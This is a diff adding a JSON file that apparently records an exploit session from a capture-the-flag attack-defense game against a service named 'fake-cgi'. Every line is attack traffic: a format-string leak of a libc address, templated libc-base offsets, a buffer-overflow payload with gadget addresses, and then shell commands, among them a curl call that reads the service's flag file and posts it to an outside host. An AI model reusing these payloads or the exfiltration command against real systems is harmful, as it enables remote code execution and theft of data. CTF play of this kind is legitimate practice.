@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0%31$p\\n", 
+    "1welcome!0x{{{LIBC_BASE:133168:12:HEX:10:0x7fb36c1a7830}}}", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:135426:8:ORI:72:0x7fb36c1a8102}}}{{{LIBC_BASE:1625431:8:ORI:80:0x7fb36c313d57}}}{{{LIBC_BASE:283536:8:ORI:88:0x7fb36c1cc390}}}\\n", 
+    "1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x01HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0whoami\\nwhoami\\ncurl http://10.0.0.2/api/flag/submit --data \"flag=`cat /flags/fake-cgi/flag`&token=aXVY498k\"\\n"
+]
